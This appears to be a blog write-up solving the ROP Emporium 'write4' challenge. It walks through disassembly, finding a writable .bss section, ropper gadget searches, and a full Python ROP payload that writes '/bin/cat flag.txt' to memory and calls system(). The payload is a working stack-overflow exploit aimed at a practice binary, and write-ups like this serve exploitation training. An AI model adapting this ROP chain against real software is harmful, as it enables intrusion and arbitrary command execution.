---
title: 04_write4
categories: [series, rop_emporium]
---

# ROP Emporium write4

* **Tools:** IDA Free 7.0, gdb-gef, ropper, readelf
* **Prerequistes:** Stack frame
* **Download solution:** [main.py](/assets/series/rop_emporium/main.py)

## Overview

> "In this challenge [...] we'll be looking for gadgets that let us write a value to memory such as mov [reg], reg."

The author states there are 3 very different ways to solve the challenge, but I'll stick with the original goal of using a `mov [reg], reg` gadget.

## Function pwnme()

Still the same, except `_fgets()` accepts an input bigger than ever:
```
0x00000000004007EC    mov     rdx, cs:stdin@@GLIBC_2_2_5 ; stream
0x00000000004007F3    lea     rax, [rbp+s]
0x00000000004007F7    mov     esi, 512        ; n
0x00000000004007FC    mov     rdi, rax        ; s
0x00000000004007FF    call    _fgets
```

## Function usefulFunction():

This function calls `_system()`, and `edi` points to the string `"/bin/ls"`:
```
0x0000000000400807    push    rbp
0x0000000000400808    mov     rbp, rsp
0x000000000040080B    mov     edi, offset command ; "/bin/ls"
0x0000000000400810    call    _system
```
In the [split](/posts/ropemporium-split) challenge, the string `"/bin/cat flag.txt"` was present in the binary. Here it has been removed, so we'll have to write it somewhere.

## Searching a writeable area

Let's search writeable sections with **readelf**:
```bash
readelf --sections ../challs/write4
There are 31 section headers, starting at offset 0x1bf0:

Section Headers:
  [Nr] Name              Type             Address           Offset
       Size              EntSize          Flags  Link  Info  Align
[...]
  [26] .bss              NOBITS           0000000000601060  00001060
       0000000000000030  0000000000000000  WA       0     0     32
[...]
```
Several sections have the **W** flag. I have chosen `.bss` as it is big enough to store the string `"/bin/cat flag.txt"`.

## Searching gadgets:

We find 2 memory writes:
```bash
ropper --search "mov [" -f ../challs/write4
[...]
0x0000000000400821: mov dword ptr [rsi], edi; ret; 
0x0000000000400820: mov qword ptr [r14], r15; ret; 
```
[]()
In order to use the first gadget, we have to control the values of `rsi` and `edi`:
```bash
ropper --search "??? ?di" -f ../challs/write4
[...]
0x0000000000400893: pop rdi; ret;
``` 
and:
```bash
ropper --search "??? ?si" -f ../challs/write4
[...]
0x0000000000400891: pop rsi; pop r15; ret;
```
Seems cool. In addition, controlling `edi` is necessary to call `_system()` properly.

In order to use the second memory write gadget, we have to control `r14` and `r15`:
```bash
ropper --search "??? r14" -f ../challs/write4
[...]
0x0000000000400890: pop r14; pop r15; ret;
```
and:
```bash
ropper --search "??? r15" -f ../challs/write4
[...]
0x0000000000400892: pop r15; ret;
```
To summarize: we can write what we want with the `pop reg` gadgets, and we can write where we want with the `mov [reg], reg` gadgets (as long as the destination is writeable).
On a side note, it is funny to see how many gadgets can be found just because `rip` can points to non-aligned addresses. however, we'll go for the `r14`/`r15` gadgets.

## Building the chain

```python
payload = b''
payload += b'\x41\x41\x41\x41\x41\x41\x41\x41' # fill buffer
payload += b'\x41\x41\x41\x41\x41\x41\x41\x41' # fill buffer
payload += b'\x41\x41\x41\x41\x41\x41\x41\x41' # fill buffer
payload += b'\x41\x41\x41\x41\x41\x41\x41\x41' # fill buffer
payload += b'\x42\x42\x42\x42\x42\x42\x42\x42' # fill buffer (overwrite RSP)

payload += b'\x90\x08\x40\x00\x00\x00\x00\x00' # pop r14, pop r15, ret
payload += b'\x60\x10\x60\x00\x00\x00\x00\x00' # r14 -> .bss
payload += b'\x2f\x62\x69\x6e\x2f\x63\x61\x74' # r15 = "/bin/cat"
payload += b'\x20\x08\x40\x00\x00\x00\x00\x00' # mov [r14], r15

payload += b'\x90\x08\x40\x00\x00\x00\x00\x00' # pop r14, pop r15, ret
payload += b'\x68\x10\x60\x00\x00\x00\x00\x00' # r14 -> .bss+8
payload += b'\x20\x66\x6c\x61\x67\x2e\x74\x78' # r15 = " flag.tx"
payload += b'\x20\x08\x40\x00\x00\x00\x00\x00' # mov [r14], r15

payload += b'\x90\x08\x40\x00\x00\x00\x00\x00' # pop r14, pop r15, ret
payload += b'\x70\x10\x60\x00\x00\x00\x00\x00' # r14 -> .bss+0x10
payload += b'\x74\x00\x00\x00\x00\x00\x00\x00' # r15 = "t\x00"
payload += b'\x20\x08\x40\x00\x00\x00\x00\x00' # mov [r14], r15

payload += b'\x93\x08\x40\x00\x00\x00\x00\x00' # pop rdi, ret
payload += b'\x60\x10\x60\x00\x00\x00\x00\x00' # rdi->"/bin/cat flag.txt"
payload += b'\x10\x08\x40\x00\x00\x00\x00\x00' # call _system()
payload += b'\x43\x43\x43\x43\x43\x43\x43\x43' # dummy (stack alignment)
payload += b'\x79\x06\x40\x00\x00\x00\x00\x00' # hlt
```
---
EOF
